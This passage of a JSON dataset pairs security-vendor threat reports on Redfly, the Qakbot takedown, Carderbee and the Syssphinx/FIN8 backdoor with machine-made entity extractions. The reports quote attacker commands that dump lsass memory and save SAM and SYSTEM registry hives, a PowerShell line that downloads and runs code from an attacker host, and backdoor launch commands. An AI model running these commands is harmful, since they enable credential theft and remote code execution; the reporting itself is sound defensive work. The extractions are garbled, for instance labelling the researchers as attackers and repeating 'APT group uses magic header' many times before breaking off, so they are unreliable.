/tn TrendView /st 07:30 /sc once /ru \" \" /f Malicious activity appeared to cease until July 27, when a keylogger (file name: winlogon.exe) was installed on a machine. The final evidence of malicious activity came on August 3, when the attackers returned and attempted to dump credentials again using a renamed version of ProcDump (file name: yara32.exe): yara32.exe -accepteula -ma lsass.exe z1.dmp Minutes later, the attackers also attempted to dump credentials from the Windows registry: reg save HKLM\\SAM sam.save reg save HKLM\\SAM sam.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SECURITY security.save reg save HKLM\\SECURITY security.save Attacks against CNI targets are not unprecedented. Almost a decade ago,Symantec uncovered the Russian-sponsored Dragonfly group’s attacksagainst the energy sectors in the U.S. and Europe. More recently, the Russian Sandworm group mounted attacks against the electricity distribution network in Ukraine, which were directed at disrupting electricity supplies. However, the frequency at which CNI organizations are being attacked appears to have increased over the past year and is now a source of concern. Threat actors maintaining a long-term, persistent presence on a national grid presents a clear risk of attacks designed to disrupt power supplies and other vital services in nation-states during times of increased political tension. While Symantec has not seen any disruptive activity by Redfly, the fact that such attacks have occurred in other regions means they are not outside the bounds of possibility. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Espionage actors, Attacker), (Redfly, Attacker), (ShadowPad, Malware), (national grid, Target), (credentials, Exploit), (computers, Target), (U.S., UK, Australian, Canadian, New Zealand, governments, Target), (Volt Typhoon, Threat Type), (Microsoft, Tool)\nRelationships: (Espionage actors, use, ShadowPad), (Espionage actors, target, national grid), (Redfly, uses, ShadowPad), (Redfly, exploited, credentials), (Redfly, compromised, computers), (Redfly, targeted, U.S., UK, Australian, Canadian, New Zealand, governments), (Volt Typhoon, uses, Microsoft), (Volt Typhoon, targeted, U.S.)",
      "entities": [
        [
          "Espionage actors",
          "Attacker"
        ],
        [
          "Redfly",
          "Attacker"
        ],
        [
          "ShadowPad",
          "Malware"
        ],
        [
          "national grid",
          "Target"
        ],
        [
          "credentials",
          "Exploit"
        ],
        [
          "computers",
          "Target"
        ],
        [
          "U.S.",
          "UK",
          "Australian",
          "Canadian",
          "New Zealand",
          "governments",
          "Target"
        ],
        [
          "Volt Typhoon",
          "Threat Type"
        ],
        [
          "Microsoft",
          "Tool"
        ]
      ],
      "relationships": [
        [
          "Espionage actors",
          "use",
          "ShadowPad"
        ],
        [
          "Espionage actors",
          "target",
          "national grid"
        ],
        [
          "Redfly",
          "uses",
          "ShadowPad"
        ],
        [
          "Redfly",
          "exploited",
          "credentials"
        ],
        [
          "Redfly",
          "compromised",
          "computers"
        ],
        [
          "Redfly",
          "targeted",
          "U.S.",
          "UK",
          "Australian",
          "Canadian",
          "New Zealand",
          "governments"
        ],
        [
          "Volt Typhoon",
          "uses",
          "Microsoft"
        ],
        [
          "Volt Typhoon",
          "targeted",
          "U.S."
        ]
      ],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 8
  },
  {
    "title": "qakbot takedown disruption",
    "link": "https://www.security.com/threat-intelligence/qakbot-takedown-disruption",
    "content": "A major international law enforcement operation has disrupted the notorious Qakbot botnet and taken much of its infrastructure offline.Led by the U.S. Federal Bureau of Investigation (FBI) and Justice Departmentand involving agencies from France, Germany, the Netherlands, the UK, Romania, and Latvia, the operation has resulted in the deletion of the Qakbot malware from more than 700,000 victim’s computers and the seizure of $8.6 million in cryptocurrency that is suspected to be the profit of cybercrime. The takedown operation saw the FBI obtaining access to Qakbot infrastructure, which allowed it to identify more than 700,000 infections and redirect the botnet’s traffic to servers controlled by the agency. An uninstaller was then distributed that removed the infected computers from the botnet. Qakbot is operated by a cybercrime group Symantec, part of Broadcom, calls Batbug. The malware is one of the most enduring threats, having first appeared in 2007. Like several similar malware families, Qakbot started life as a banking Trojan and, aside from its prevalence, it became known for its functionality and adaptability. For example, once it infected one machine in an organization, it was able to spread laterally across networks utilizing a worm-like functionality through brute-forcing network shares and Active Directory user group accounts, or via server message block (SMB) exploitation. Qakbot is largely spread via email. While it was once delivered by the Emotet botnet, Qakbot is now usually delivered directly via email spam runs, suggesting its operators acquired access to spamming infrastructure following Emotet’s disappearance. These emails may include a malicious link or attachment, and the subject lines generally refer to popular lure subjects such as shipping updates, work orders, urgent requests, invoices, and claims. In recent years, Qakbot has become closely associated with ransomware activity with Qakbot infections acting as the initial breach that ultimately leads to ransomware deployment on an organization’s network. Qakbot has been associated with multiple ransomware operations in recent years, including Sodinokibi, Egregor, ProLock, and MountLocker. Most recently, it has been seen collaborating with the BlackBasta ransomware operation. Activity by Qakbot stepped up significantly from January 2023, when its malicious emails leveraged Microsoft OneNote attachments to drop Qakbot on infected machines. OneNote is a desktop digital notebook application that is installed by default in all Microsoft Office/365 installations. Even if a Windows user does not typically use the application, it is still available to open the file format. The malicious emails contained an embedded URL. When clicked, it leads to a ZIP archive that contains a malicious OneNote file. Clicking on this file leads to the execution of an HTML Application (HTA) file that ultimately leads to a Qakbot DLL being downloaded onto a victim’s machine. It is downloaded as a .png file via curl before being loaded by rundll32.exe. There were indications in at least one Qakbot attack observed by Symantec that the initial access vector may have been malvertising. The attack chain in that instance began with the victim visiting a malicious website on the Chrome browser. This coincided with reports about malware, including IcedID, being spread via ads on Google. This surge in Qakbot activity appeared to last until June 2023. The attackers made frequent tweaks to their attack chain, likely in a bid to evade detection. OneNote files were eventually abandoned and by June the attackers were largely favoring PDF documents, which led to URLs from which malicious ZIP archives containing JavaScript downloaders were downloaded. It is unclear yet whether Qakbot's sudden cessation of activity in June was linked to this takedown operation. Batbug has long been one of the largest players in the cybercrime landscape, controlling a lucrative malware distribution network that was linked to multiple major ransomware gangs. This takedown is likely to disrupt Batbug’s operations and it is possible that the group may struggle to rebuild its infrastructure in its aftermath. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Qakbot, Malware), (Batbug, Attacker), (Emotet, Threat Type), (SMB, Technique), (Active Directory, Vulnerability), (networks, Environment), (email, Method)\nRelationships: (Qakbot, uses, Batbug), (Qakbot, spreads, email), (Qakbot, spreads, Emotet), (Qakbot, exploited, SMB), (Qakbot, exploited, Active Directory), (Qakbot, operates, Emotet)",
      "entities": [
        [
          "Qakbot",
          "Malware"
        ],
        [
          "Batbug",
          "Attacker"
        ],
        [
          "Emotet",
          "Threat Type"
        ],
        [
          "SMB",
          "Technique"
        ],
        [
          "Active Directory",
          "Vulnerability"
        ],
        [
          "networks",
          "Environment"
        ],
        [
          "email",
          "Method"
        ]
      ],
      "relationships": [
        [
          "Qakbot",
          "uses",
          "Batbug"
        ],
        [
          "Qakbot",
          "spreads",
          "email"
        ],
        [
          "Qakbot",
          "spreads",
          "Emotet"
        ],
        [
          "Qakbot",
          "exploited",
          "SMB"
        ],
        [
          "Qakbot",
          "exploited",
          "Active Directory"
        ],
        [
          "Qakbot",
          "operates",
          "Emotet"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 6
  },
  {
    "title": "carderbee software supply chain certificate abuse",
    "link": "https://www.security.com/threat-intelligence/carderbee-software-supply-chain-certificate-abuse",
    "content": "12.20pm BST, 22 August 2023: Updated with additional IoCs A previously unknown advanced persistent threat (APT) group used the legitimate Cobra DocGuard software to carry out a supply chain attack with the goal of deploying the Korplug backdoor (aka PlugX) onto victim computers. In the course of this attack, the attackers used malware signed with a legitimate Microsoft certificate. Most of the victims in this campaign are based in Hong Kong, with some victims based in other regions of Asia. Korplug is known to be used by multiple APT groups, but we could not link this activity to a known threat actor so we have given the actor behind this activity a new name — Carderbee. Cobra DocGuard Client is software produced by a China-based company called EsafeNet and appears to legitimately be used to protect, encrypt, and decrypt software. EsafeNet is owned by Chinese information security firm NSFOCUS. According to a report from ESET, in September 2022, a malicious update to this software was used to compromise a gambling company in Hong Kong. The same gambling company had been compromised in September 2021 using the same technique by Budworm (aka LuckyMouse, APT27), which led ESET to attribute this September 2022 attack to Budworm too. In that attack, a new variant of the Korplug malware was also found. In that instance, it used the magic header “ESET”, indicating that it may have been modified to try to bypass ESET products. A signed version of Korplug was also used in the activity investigated by the Symantec Threat Hunter Team, part of Broadcom. This activity began in April 2023. However, we did not find any other evidence to indicate that this attack was carried out by Budworm. Korplug is a backdoor that is known to be used by multiple APTs, including APT41 and Budworm. We do not have any indication of the industry sectors of the companies targeted in this recent activity, just their geographic location. Accordingly, it was not possible to link this activity definitively to a known group, which is why we attributed it to a new group, Carderbee. Malicious activity was seen on about 100 computers in impacted organizations; however, the Cobra DocGuard software was installed on around 2,000 computers, indicating that the attacker may be selectively pushing payloads to specific victims. The malicious software was delivered to the following location on infected computers, which is what indicates that a supply chain attack or malicious configuration involving Cobra DocGuard is how the attackers compromised affected computers: \"csidl_system_drive\\program files\\esafenet\\cobra docguard client\\update\" Over a period of a few months in 2023, multiple distinct malware families were observed being deployed via this method. In one interesting case, a downloader deployed by the attackers had a digitally signed certificate from Microsoft, called Microsoft Windows Hardware Compatibility Publisher. This downloader was used to install the Korplug backdoor on targeted systems. The downloader attempted to download a file named update.zip from the following location:http://cdn.stream-amazon[.]com/update.zip. The update.zip file is a zlib compressed archive file. It decompresses and executes a file named content.dll. This file is not saved on disk. It acts as a dropper and contains x64 and x86 drivers, which are dropped depending on the system environment. The dropper creates services and registry entries. The dropped drivers read encrypted data from the registry, decrypt it, and inject it into svchost.exe. The injected payload is the Korplug backdoor. The Korplug sample downloaded here is able to: Use of Microsoft-signed malwareis a known problem. In December 2022,Mandiant noteda POORTRY driver sample signed with a Microsoft Windows Hardware Compatibility Authenticode signature. Most recently, in July 2023,Trend saidthat it had found a Microsoft-signed rootkit that appeared to have passed through the Windows Hardware Quality Labs (WHQL) process for getting a valid signature. Microsoftacknowledged the issueand said that drivers certified by Microsoft’s Windows Hardware Developer Program (MWHDP) were being used maliciously in post-exploitation activity. The company said it had investigated the issue and “determined that the activity was limited to the abuse of several developer program accounts and that no Microsoft account compromise has been identified.” Malware signed with what appears to be a legitimate certificate can make it much harder for security software to detect. It seems clear that the attackers behind this activity are patient and skilled actors. They leverage both a supply chain attack and signed malware to carry out their activity in an attempt to stay under the radar. The fact that they appear to only deploy their payload on a handful of the computers they gain access to also points to a certain amount of planning and reconnaissance on behalf of the attackers behind this activity. Software supply chain attacks remain a major issue for organizations in all sectors, with multiple high-profile supply chain attacks occurring in the last 12 months, including theMOVEit,X_Trader, and3CX attacks. Some unanswered questions remain about the activity of Carderbee, such as what sectors the group was targeting with this activity, and whether there are any links between Carderbee and other actors such as Budworm. Symantec researchers will continue to track this activity, and we share indicators of compromise below so our colleagues in the security community can do so as well. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 96170614bbd02223dc79cec12afb6b11004c8edb8f3de91f78a6fc54d0844622 19a6a404605be964ab87905d59402e2890460709a1d9038c66b3fbeedc1a2343 1ff7b55dde007b7909f43dd47692f7c171caa2897d663eb9db01001062b1fe9d 2400d8e66c652f4f8a13c99a5ffb67cb5c0510144b30e93122b1809b58614936 2f714aaf9e3e3e03e8168fe5e22ba6d8c1b04cbfa3d37ff389e9f1568a80cad4 47b660bbaacb2a602640b5e2c589a3adc620a0bfc9f0ecfb8d813a803d7b75e2 5467e163621698b38c2ba82372bac110cea4121d7c1cec096958a4d9eaa44be7 7e6d0f14302662f52e4379eb5b69a3749d8597e8f61266aeda74611258972a3d 85fc7628c5c7190f25da7a2c7ee16fc2ad581e1b0b07ba4ac33cff4c6e94c8af 8bd40da84c8fa5f6f8e058ae7e36e1023aca1b9a9c8379704934a077080da76f 8ca135b2f4df6a714b56c1a47ac5baa80a11c6a4fcc1d84a047d77da1628f53f 9e96f70ce312f2638a99cfbd3820e85798c0103c7dc06fe0182523e3bf1e2805 9fc49d9f4b922112c2bafe3f1181de6540d94f901b823e11c008f6d1b2de218c b5159f8ae16deda7aa5d55100a0eac6e5dacd1f6502689b543513a742353d1ea b7b8ea25786f8e82aabe4a4385c6142d9afe03f090d1433d0dc6d4d6ccc27510 b84f68ab098ce43f9cb363d0a20a2267e7130078d3d2d8408bfb32bbca95ca37 f64267decaa982c63185d92e028f52c31c036e85b2731a6e0bccdb8f7b646e97 http://111.231.100[.]228:8888/CDGServer3/UpgradeService2 http://103.151.28[.]11:8090/CDGServer3/UpgradeService2 cdn.stream-amazon[.]com tjj.active-microsoft[.]com githubassets.akamaixed[.]net ms-g9-sites-prod-cdn.akamaixed[.]net ms-f7-sites-prod-cdn.akamaixed[.]net The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (APT group, Attacker), (Korplug, Malware), (PlugX, Malware), (Carderbee, Attacker), (Cobra DocGuard, Tool), (Cobra DocGuard Client, Tool), (Esfanet, Tool), (NSFOCUS, Tool), (Budworm, Attacker), (LuckyMouse, Attacker), (APT27, Attacker), (Corporation, Victim), (Gambling Company, Victim), (Magic Header, Indicator)\nRelationships: (APT group, uses, Korplug), (APT group, uses, PlugX), (APT group, targets, Corporation), (APT group, targets, Gambling Company), (APT group, uses, magic header), (APT group, attributedTo, Carderbee), (APT group, uses, Cobra DocGuard), (APT group, uses, Cobra DocGuard Client), (APT group, uses, Budworm), (APT group, uses, LuckyMouse), (APT group, uses, magic header), (APT group, uses, magic header), (APT group, uses, magic header), (APT group, uses, magic header), (APT group, uses, magic header), (APT group, uses, magic header), (APT group, uses, magic header), (APT group, uses, magic header), (APT group, uses, magic header), (APT group, uses, magic header), (APT group,",
      "entities": [
        [
          "APT group",
          "Attacker"
        ],
        [
          "Korplug",
          "Malware"
        ],
        [
          "PlugX",
          "Malware"
        ],
        [
          "Carderbee",
          "Attacker"
        ],
        [
          "Cobra DocGuard",
          "Tool"
        ],
        [
          "Cobra DocGuard Client",
          "Tool"
        ],
        [
          "Esfanet",
          "Tool"
        ],
        [
          "NSFOCUS",
          "Tool"
        ],
        [
          "Budworm",
          "Attacker"
        ],
        [
          "LuckyMouse",
          "Attacker"
        ],
        [
          "APT27",
          "Attacker"
        ],
        [
          "Corporation",
          "Victim"
        ],
        [
          "Gambling Company",
          "Victim"
        ],
        [
          "Magic Header",
          "Indicator"
        ]
      ],
      "relationships": [
        [
          "APT group",
          "uses",
          "Korplug"
        ],
        [
          "APT group",
          "uses",
          "PlugX"
        ],
        [
          "APT group",
          "targets",
          "Corporation"
        ],
        [
          "APT group",
          "targets",
          "Gambling Company"
        ],
        [
          "APT group",
          "uses",
          "magic header"
        ],
        [
          "APT group",
          "attributedTo",
          "Carderbee"
        ],
        [
          "APT group",
          "uses",
          "Cobra DocGuard"
        ],
        [
          "APT group",
          "uses",
          "Cobra DocGuard Client"
        ],
        [
          "APT group",
          "uses",
          "Budworm"
        ],
        [
          "APT group",
          "uses",
          "LuckyMouse"
        ],
        [
          "APT group",
          "uses",
          "magic header"
        ],
        [
          "APT group",
          "uses",
          "magic header"
        ],
        [
          "APT group",
          "uses",
          "magic header"
        ],
        [
          "APT group",
          "uses",
          "magic header"
        ],
        [
          "APT group",
          "uses",
          "magic header"
        ],
        [
          "APT group",
          "uses",
          "magic header"
        ],
        [
          "APT group",
          "uses",
          "magic header"
        ],
        [
          "APT group",
          "uses",
          "magic header"
        ],
        [
          "APT group",
          "uses",
          "magic header"
        ],
        [
          "APT group",
          "uses",
          "magic header"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 14,
    "relationship_count": 20
  },
  {
    "title": "syssphinx fin8 backdoor",
    "link": "https://www.security.com/threat-intelligence/syssphinx-fin8-backdoor",
    "content": "Symantec’s Threat Hunter Team, a part ofBroadcom, recently observed the Syssphinx (aka FIN8) cyber-crime group deploying a variant of the Sardonic backdoor to deliver the Noberus ransomware. While analysis of the backdoor revealed it to be part of the Sardonic framework previously used by the group, and analyzed in a2021 report from Bitdefender, it seems that most of the backdoor’s features have been altered to give it a new appearance. Active since at least January 2016, Syssphinx (aka FIN8) is a financially motivated cyber-crime group known for targeting organizations in the hospitality, retail, entertainment, insurance, technology, chemicals, and finance sectors. The group is known for utilizing so-called living-off-the-land tactics, making use of built-in tools and interfaces such as PowerShell and WMI, and abusing legitimate services to disguise its activity. Social engineering and spear-phishing are two of the group’s preferred methods for initial compromise. While Syssphinx initially specialized in point-of-sale (POS) attacks, in the past few years the group has been observed using a number of ransomware threats in its attacks. In June 2021, Syssphinx was seen deploying the Ragnar Locker ransomware onto machines it had compromised in a financial services company in the U.S. earlier in the year. The activity marked the first time the group was observed using ransomware in its attacks. Ragnar Locker is developed by a financially motivated cyber-crime group Symantec calls Hornworm (aka Viking Spider). In January 2022, a family of ransomware known as White Rabbit was linked to Syssphinx. A malicious URL linked to White Rabbit attacks was alsolinked to Syssphinx. In addition, attacks involving White Rabbit used a variant of the Sardonic backdoor, a known Syssphinx tool. In December 2022, Symantec observed the group attempting to deploy theNoberus(aka ALPHV, BlackCat) ransomware in attacks. Noberus is operated by a financially motivated cyber-crime group Symantec calls Coreid (aka Blackmatter, Carbon Spider, FIN7). The Syssphinx group’s move to ransomware suggests the threat actors may be diversifying their focus in an effort to maximize profits from compromised organizations. Syssphinx is known for taking extended breaks between attack campaigns in order to improve its tactics, techniques, and procedures (TTPs). For instance, since 2019, Syssphinx had used backdoor malware called Badhatch in attacks. Syssphinx updated Badhatch in December 2020 and then again in January 2021. Then in August 2021, Bitdefender researcherspublished detailsof a new backdoor dubbed Sardonic and linked it to the same group. The C++-based Sardonic backdoor has the ability to harvest system information and execute commands, and has a plugin system designed to load and execute additional malware payloads delivered as DLLs. The Syssphinx attack observed by Symantec in December 2022, in which the attackers attempted to deploy the Noberus ransomware, involved similar techniques as a Syssphinx attackdescribed by Bitdefender researchers in 2021. However, the most recent attack had some key differences, including the final payload being the Noberus ransomware and the use of a reworked backdoor. The revamped Sardonic backdoor analyzed in this blog shares a number of features with the C++-based Sardonic backdoor analyzed by Bitdefender. However, most of the backdoor’s code has been rewritten, such that it gains a new appearance. Interestingly, the backdoor code no longer uses the C++ standard library and most of the object-oriented features have been replaced with a plain C implementation. In addition, some of the reworkings look unnatural, suggesting that the primary goal of the threat actors could be to avoid similarities with previously disclosed details. For example, when sending messages over the network, the operation code specifying how to interpret the message has been moved after the variable part of the message, a change that adds some complications to the backdoor logic. This goal seemed limited to just the backdoor itself, as known Syssphinx techniques were still used. During the December 2022 incident, the attackers connected with PsExec to execute the command “quser” in order to display the session details and then the following command to launch the backdoor: powershell.exe -nop -ep bypass -c iex (New-Object System.Net.WebClient).DownloadString('https://37-10-71-215[.]nip[.]io:8443/7ea5fa') Next, the attackers connected to the backdoor to check details of the affected computer before executing the command to establish persistence. powershell -nop -ep bypass -c CSIDL_WINDOWS\\temp\\1.ps1 2BDf39983402C1E50e1d4b85766AcF7a This resulted with a process similar to that described by Bitdefender. powershell.exe -nop -c [System.Reflection.Assembly]::Load(([WmiClass] 'root\\cimv2:System__Cls').Properties['Parameter'].Value);[a8E95540.b2ADc60F955]::c3B3FE9127a() The next day, the attackers connected to the persistent backdoor, but paused after running a few basic commands. Roughly 30 minutes later, the activity resumed with the attackers using what looked like wmiexec.py from Impacket, which started a process to launch a new backdoor. cmd.exe /Q /c powershell -nop -ep bypass -c CSIDL_SYSTEM_DRIVE\\shvnc.ps1 1> \\\\127.0.0.1\\ADMIN$\\__1671129123.2520242 2>&1 This new backdoor was used by the attackers for the next few hours. Interestingly, the new backdoor PowerShell script uses a new file name and simplifies the command-line by removing the decryption key argument. Switching the tools like this could indicate that the attackers are testing new features, so we were curious to analyze this new sample in detail. One difference between the attack described by Bitdefender and the recent attacks observed by Symantec is the technique used to deploy the backdoor. In our case, the backdoor is embedded (indirectly) into a PowerShell script (see Figure 1) used to infect target machines, while the variant documented by Bitdefender features intermediate downloader shellcode that downloads and executes the backdoor. The PowerShell script used by Syssphinx can be seen in Figure 2. The intention of the first line of code is to delete the PowerShell script file itself. The second line checks the architecture of the current process and picks the 32-bit or 64-bit version of the encoded .NET Loader as appropriate. The third line decodes the .NET Loader binary and loads it into the current process. Finally, the fourth line of code starts the main functionality of the .NET Loader, where the injector and backdoor are decrypted and control is passed to the injector. The .NET Loader is an obfuscated .NET DLL. The obfuscation manifests certain ConfuserEx features. The .NET Loader contains two blobs, which it first decrypts with the RC4 algorithm using a hardcoded decryption key before decompressing. The decompressed blobs are then copied into a continuous chunk of memory. The .NET Loader then transfers control to the second blob (injector), passing the memory location and size of the first blob (backdoor) as parameters. The injector is in the form of shellcode and its entrypoint is shown in Figure 3. The decrypt_dwords subroutine seen in Figure 3 decrypts a few dwords (marked as encrypted_dwords in Figure 3) to reveal a short chunk of code. The revealed code is shown in Figure 4 and includes a decryption loop that looks similar to the “shellcode decryption routine” described in Bitdefender’s report. After the decryption loop completes execution, we can see the full logic of the entrypoint (Figure 5). The purpose of the injector is to start the backdoor in a newly created WmiPrvSE.exe process. When creating the WmiPrvSE.exe process, the injector attempts to start it in session-0 (best effort) using a token stolen from the lsass.exe process. The Backdoor is also in the form of shellcode and its entrypoint looks similar to that of the injector entrypoint, with the exception of polymorphism. One of the interesting features of the backdoor is related to interactive sessions, where the attacker runs cmd.exe or other interactive processes on the affected computer. Interestingly, the sample allows up to 10 such sessions to run at the same time. In addition, when starting each individual process, the attacker may use a process token stolen from a specified process ID that is different for each session. Another notable feature is that the backdoor supports three different formats to extend its functionality. The first is with PE DLL plugins that the backdoor loads within its own process and then calls: The second format supported by the backdoor is in the form of shellcode, where each shellcode plugin executes in its own dedicated process. Before starting the shellcode, the backdoor creates a new process and writes into its memory the shellcode blob preceded by a simple structure storing a copy of arguments received from the remote attacker. It then uses the QueueUserAPC API to execute the shellcode, such that the address of the mentioned structure is passed as the first and only shellcode argument. To unload any shellcode plugin, the backdoor simply terminates the process associated with the specified plugin. Finally, the third format is also in the form of shellcode but with a different convention to pass the arguments. The backdoor executes this shellcode in the context of the backdoor's main thread and no other commands are accepted until the shellcode returns. To execute the shellcode, the backdoor simply calls it as a subroutine passing four arguments, each providing the address of the corresponding argument received from the remote attacker (the backdoor appears to use 64-bit values when passing the addresses in case of 32-bit shellcode). Network communication When communicating with its command-and-control (C&C) server, the backdoor exchanges messages of variable size using the structure shown in Table 1. The size of body field (body_size) can be determined from the content of the header field as explained in the following sections. Once the backdoor connects to its C&C server, it sends the initial message of 0x10C bytes with: The body field of the initial message is 0x100 bytes and uses the structure shown in Table 2. The size of rc4_key filed (rc4_key_size) is always 0x40 bytes. The snippet shown below roughly demonstrates the method used by the backdoor to generate the infection_id. uint16_t sum_words(void *data, size_t size) uint16_t *words = data; while (size >= sizeof(*words)) { size -= sizeof(*words); void mix(char *identifier, size_t identifier_size, char *seed, size_t seed_length) const char hex_digits[] = \"0123456789ABCDEF\"; for (size_t position = 1; position < identifier_size; position += 2) { int value = index * ~( seed[(index - 1) % seed_length] + seed[(index % identifier_size) % seed_length] + seed[((index + 1) % identifier_size) % seed_length] + seed[((index + 2) % identifier_size) % seed_length] identifier[position - 1] = hex_digits[(value >> 4) & 0x0f]; identifier[position] = hex_digits[value & 0x0f]; void generate_infection_id(char *infection_id, size_t infection_id_size) CHAR computer_name[0x400] = {}; DWORD computer_name_size = sizeof(computer_name); GetComputerNameA(computer_name, &computer_name_size); int cpu_info[4] = {}; __cpuid(cpu_info, 0); DWORD volume_serial_number = 0; GetVolumeInformationA(\"c:\\\\\", 0, 0, &volume_serial_number, 0, 0, 0, 0); size_t seed_length = snprintf(seed, sizeof(seed), \"%s%hu%hu\", sum_words(cpu_info, sizeof(cpu_info)), sum_words(&volume_serial_number, sizeof(volume_serial_number))); mix(infection_id, infection_id_size, seed, seed_length); For all the communication that follows (incoming and outgoing), the backdoor uses the following method to determine the size of the body field (body_size): The content of body and footer fields is encrypted with the RC4 algorithm using rc4_key as the encryption key. The keystream is reused when encrypting each individual field. The footer field is 8 bytes and, once decrypted, uses the structure shown in Table 3. Finally, the structure of the decrypted body field varies depending on the message_type. The backdoor has the ability to receive and carry out the commands listed in Table 4. Syssphinx continues to develop and improve its capabilities and malware delivery infrastructure, periodically refining its tools and tactics to avoid detection. The group’s decision to expand from point-of-sale attacks to the deployment of ransomware demonstrates the threat actors’ dedication to maximizing profits from victim organizations. The tools and tactics detailed in this report serve to underscore how this highly skilled financial threat actor remains a serious threat to organizations. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 1d3e573d432ef094fba33f615aa0564feffa99853af77e10367f54dc6df95509 – PowerShell script 307c3e23a4ba65749e49932c03d5d3eb58d133bc6623c436756e48de68b9cc45 – Hacktool.Mimikatz 48e3add1881d60e0f6a036cfdb24426266f23f624a4cd57b8ea945e9ca98e6fd – DLL file 4db89c39db14f4d9f76d06c50fef2d9282e83c03e8c948a863b58dedc43edd31 – 32-bit shellcode 356adc348e9a28fc760e75029839da5d374d11db5e41a74147a263290ae77501 – 32-bit shellcode e7175ae2e0f0279fe3c4d5fc33e77b2bea51e0a7ad29f458b609afca0ab62b0b – 32-bit shellcode e4e3a4f1c87ff79f99f42b5bbe9727481d43d68582799309785c95d1d0de789a – 64-bit shellcode 2cd2e79e18849b882ba40a1f3f432a24e3c146bb52137c7543806f22c617d62c – 64-bit shellcode 78109d8e0fbe32ae7ec7c8d1c16e21bec0a0da3d58d98b6b266fbc53bb5bc00e – 64-bit shellcode ede6ca7c3c3aedeb70e8504e1df70988263aab60ac664d03995bce645dff0935 5b8b732d0bb708aa51ac7f8a4ff5ca5ea99a84112b8b22d13674da7a8ca18c28 4e73e9a546e334f0aee8da7d191c56d25e6360ba7a79dc02fe93efbd41ff7aa4 05236172591d843b15987de2243ff1bfb41c7b959d7c917949a7533ed60aafd9 edfd3ae4def3ddffb37bad3424eb73c17e156ba5f63fd1d651df2f5b8e34a6c7 827448cf3c7ddc67dca6618f4c8b1197ee2abe3526e27052d09948da2bc500ea 0e11a050369010683a7ed6a51f5ec320cd885128804713bb9df0e056e29dc3b0 0980aa80e52cc18e7b3909a0173a9efb60f9d406993d26fe3af35870ef1604d0 64f8ac7b3b28d763f0a8f6cdb4ce1e5e3892b0338c9240f27057dd9e087e3111 2d39a58887026b99176eb16c1bba4f6971c985ac9acbd9e2747dd0620548aaf3 8cfb05cde6af3cf4e0cb025faa597c2641a4ab372268823a29baef37c6c45946 72fd2f51f36ba6c842fdc801464a49dce28bd851589c7401f64bbc4f1a468b1a 6cba6d8a1a73572a1a49372c9b7adfa471a3a1302dc71c4547685bcbb1eda432 37.10.71[.]215 – C&C server 104-168-237-21.sslip[.]io The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec's Threat Hunter Team, Attacker), (Syrinx, Malware), (FIN8, Attacker), (Sardonic, Malware), (Noberus, Malware), (living-off-the-land, Technique), (POSS, Technique), (ragnar locker, Malware), (financially motivated cyber-crime group, Attacker), (Bitdefender, Tool), (A2021, Report), (Spear Phishing, Technique), (Social Engineering, Technique), (U.S., Location), (Financial Services Company, Target)\nRelationships: (Symantec's Threat Hunter Team, uses, Syssphinx), (Syssphinx, uses, Sardonic), (Sardonic, contains, Noberus), (Sardonic, contains, Ragnar Locker), (Spear Phishing, usedBy, Syssphinx), (Social Engineering, usedBy, Syssphinx), (Spear Phishing, associatedWith, Syssphinx), (Social Engineering, associatedWith, Syssphinx), (Spear Phishing, connectedTo, Syssphinx), (Social Engineering, connectedTo, Syssphinx), (Spear Phishing, executedBy, Syssphinx), (Social Engineering, executedBy, Syssphinx), (Spear Phishing, launchedBy, Syssphinx), (Social Engineering, launchedBy, Syssphinx), (Spear Phishing,",
      "entities": [
        [
          "Symantec's Threat Hunter Team",
          "Attacker"
        ],
        [
          "Syrinx",
          "Malware"
        ],
        [
          "FIN8",
          "Attacker"
        ],
        [
          "Sardonic",
          "Malware"
        ],
        [
          "Noberus",
          "Malware"
        ],
        [
          "living-off-the-land",
          "Technique"
        ],
        [
          "POSS",
          "Technique"
        ],
        [
          "ragnar locker",
          "Malware"
        ],
        [
          "financially motivated cyber-crime group",
          "Attacker"
        ],
        [
          "Bitdefender",
          "Tool"
        ],
        [
          "A2021",
          "Report"
        ],
        [
          "Spear Phishing",
          "Technique"
        ],
        [
          "Social Engineering",
          "Technique"
        ],
        [
          "U.S.",
          "Location"
        ],
        [
          "Financial Services Company",
          "Target"
        ]
      ],
      "relationships": [
        [
          "Symantec's Threat Hunter Team",
          "uses",
          "Syssphinx"
        ],
        [
          "Syssphinx",
          "uses",
          "Sardonic"
        ],
        [
          "Sardonic",
          "contains",
          "Noberus"
        ],
        [
          "Sardonic",
          "contains",
          "Ragnar Locker"
        ],
        [
          "Spear Phishing",
          "usedBy",
          "Syssphinx"
        ],
        [
          "Social Engineering",
          "usedBy",
          "Syssphinx"
        ],
        [
          "Spear Phishing",
          "associatedWith",
          "Syssphinx"
        ],
        [
          "Social Engineering",
          "associatedWith",
          "Syssphinx"
        ],
        [
          "Spear Phishing",
          "connectedTo",
          "Syssphinx"
        ],
        [
